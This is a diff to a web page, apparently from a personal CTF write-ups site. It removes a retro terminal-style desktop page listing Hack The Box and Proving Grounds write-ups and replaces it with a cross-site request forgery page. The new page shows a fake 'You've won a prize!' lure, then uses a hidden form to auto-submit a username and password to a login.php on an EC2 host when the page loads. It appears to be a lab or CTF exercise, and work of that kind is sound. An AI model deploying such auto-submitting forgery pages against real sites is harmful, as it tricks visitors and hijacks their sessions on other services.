@@ -1,149 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Diablo Retro Linux Desktop</title>
-  <style>
-    body {
-      margin: 0;
-      background: #111;
-      font-family: monospace;
-      color: #00ff00;
-      overflow: hidden;
-    }
+<html>
+  <body>
+    <h1>You've won a prize! Click to claim.</h1>
+    <form id="csrf-form" action="http://ec2-3-107-205-120.ap-southeast-2.compute.amazonaws.com/phpshrinkit/login.php" method="POST">
+      <input type="hidden" name="user" value="diablo" />
+      <input type="hidden" name="pwd" value="diablo1" />
+      <input type="hidden" name="step" value="login" />
+      <input type="hidden" name="submit" value="Submit" />
+    </form>
 
-    /* Top bar */
-    .taskbar {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 25px;
-      background: #222;
-      color: #00ff00;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 0 10px;
-      font-size: 14px;
-      border-bottom: 2px solid #00ff00;
-    }
-
-    .taskbar .title {
-      font-weight: bold;
-    }
-
-    /* Window */
-    .window {
-      position: absolute;
-      top: 60px;
-      left: 50px;
-      width: 500px;
-      background: #000;
-      border: 2px solid #00ff00;
-      box-shadow: 3px 3px 15px #000;
-    }
-
-    .window-header {
-      background: #222;
-      color: #00ff00;
-      padding: 5px;
-      cursor: move;
-      border-bottom: 2px solid #00ff00;
-      display: flex;
-      justify-content: space-between;
-    }
-
-    .window-header .buttons {
-      display: flex;
-      gap: 5px;
-    }
-
-    .btn {
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-      display: inline-block;
-    }
-    .btn.red { background: red; }
-    .btn.yellow { background: yellow; }
-    .btn.green { background: lime; }
-
-    .window-content {
-      padding: 15px;
-      height: 300px;
-      overflow-y: auto;
-      background: #000;
-    }
-
-    a {
-      color: cyan;
-      text-decoration: none;
-    }
-    a:hover {
-      color: #ff0000;
-    }
-  </style>
-</head>
-<body>
-  <!-- Taskbar -->
-  <div class="taskbar">
-    <div class="title">[ Diablo@LinuxBox ]</div>
-    <div class="clock" id="clock"></div>
-  </div>
-
-  <!-- Terminal window -->
-  <div class="window" id="terminal">
-    <div class="window-header">
-      <span>Terminal - CTF Writeups</span>
-      <div class="buttons">
-        <span class="btn red"></span>
-        <span class="btn yellow"></span>
-        <span class="btn green"></span>
-      </div>
-    </div>
-    <div class="window-content">
-      <pre>
-Welcome to Diablo’s Linux workstation.
-Type 'ls' to view writeups.
-      </pre>
-      <ul>
-        <li><a href="writeups/htb_machine1.html">HTB - Machine 1</a></li>
-        <li><a href="writeups/pg_lab1.html">Proving Grounds - Lab 1</a></li>
-        <li><a href="writeups/custom_ctf.html">Custom CTF - Web Exploit</a></li>
-      </ul>
-    </div>
-  </div>
-
-  <script>
-    // Clock updater
-    function updateClock() {
-      const now = new Date();
-      document.getElementById("clock").innerText =
-        now.toLocaleDateString() + " " + now.toLocaleTimeString();
-    }
-    setInterval(updateClock, 1000);
-    updateClock();
-
-    // Drag window
-    const win = document.getElementById("terminal");
-    const header = win.querySelector(".window-header");
-    let offsetX, offsetY, isDown = false;
-
-    header.addEventListener("mousedown", e => {
-      isDown = true;
-      offsetX = win.offsetLeft - e.clientX;
-      offsetY = win.offsetTop - e.clientY;
-    });
-
-    document.addEventListener("mouseup", () => isDown = false);
-    document.addEventListener("mousemove", e => {
-      if (isDown) {
-        win.style.left = e.clientX + offsetX + "px";
-        win.style.top = e.clientY + offsetY + "px";
-      }
-    });
-  </script>
-</body>
+    <script>
+      // This script automatically submits the form as soon as the page loads
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
 </html>
